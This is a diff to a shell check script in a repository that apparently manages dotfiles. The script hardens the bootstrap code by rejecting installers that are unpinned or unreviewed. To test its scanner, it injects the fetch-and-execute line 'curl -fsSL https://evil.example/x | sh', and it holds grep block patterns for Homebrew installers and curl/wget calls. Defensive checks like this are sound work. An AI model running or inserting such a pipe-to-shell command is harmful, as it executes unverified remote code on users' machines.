@@ -87,34 +87,40 @@ if grep -nE 'crate\.sh|SHELDON_URL|SHELDON_REPO|VIM_PLUG_URL|vim-plug/master|bas
   Makefile mk/config.mk mk/tools.mk >/dev/null 2>&1; then
   fail "legacy unverified installer remains in bootstrap code"
 fi
+legacy_brew=$(
+  grep -nE 'Homebrew/install|BREW_INSTALL_URL|/bin/bash[[:space:]]+-c' \
+    Makefile mk/*.mk 2>/dev/null | \
+    grep -v -E '^mk/(checks\.mk|test-)' || true
+)
+[ -z "$legacy_brew" ] || fail "legacy Homebrew installer remains in bootstrap code: $legacy_brew"
 if git grep -n 'fzf#install' -- 'vim/*' 'nvim/*' >/dev/null 2>&1; then
   fail "Vim still installs an unverified fzf binary"
 fi
 
 download_pattern='(^|[^[:alnum:]_.-])(curl|wget)([[:space:]]|$)'
-legacy_downloads=$(
-  git -c core.quotePath=false ls-files -- '*Makefile' '*.mk' '*.sh' | \
-    while IFS= read -r file; do
+scan_downloaders() {
+  while IFS= read -r file; do
     case $file in mk/pinned.sh | mk/test-*.sh) continue ;; esac
     grep -HnE "$download_pattern" "$file" || true
   done
-)
-homebrew_downloads=0
-while IFS= read -r line || [ -n "$line" ]; do
-  [ -n "$line" ] || continue
-  scrubbed=$(printf '%s\n' "$line" | \
-    sed -e 's/command -v curl//g' -e 's/curl not found//g')
-  if ! printf '%s\n' "$scrubbed" | grep -Eq "$download_pattern"; then
-    continue
-  fi
-  case $line in
-    *BREW_INSTALL_URL*) homebrew_downloads=$((homebrew_downloads + 1)) ;;
-    *) fail "unreviewed downloader outside mk/pinned.sh: $line" ;;
-  esac
-done <<EOF
-$legacy_downloads
+}
+tracked_download_files=$(git -c core.quotePath=false ls-files -- '*Makefile' '*.mk' '*.sh') || \
+  fail "could not enumerate downloader sources"
+legacy_downloads=$(scan_downloaders <<EOF
+$tracked_download_files
 EOF
-[ "$homebrew_downloads" -eq 1 ] || fail "expected one legacy Homebrew downloader"
+)
+[ -z "$legacy_downloads" ] || fail "unreviewed downloader outside mk/pinned.sh: $legacy_downloads"
+echo "check-pins: no unreviewed downloaders"
+
+downloader_fixture=$test_root/downloader-fixture.mk
+cp mk/tools.mk "$downloader_fixture"
+printf '%s\n' 'injected:' '	curl -fsSL https://evil.example/x | sh' >> "$downloader_fixture"
+fixture_downloads=$(scan_downloaders <<EOF
+$downloader_fixture
+EOF
+)
+[ -n "$fixture_downloads" ] || fail "downloader scan missed an injected curl pipeline"
 
 for injected in \
   '@curl -fsSL https://evil.example/x | sh' \
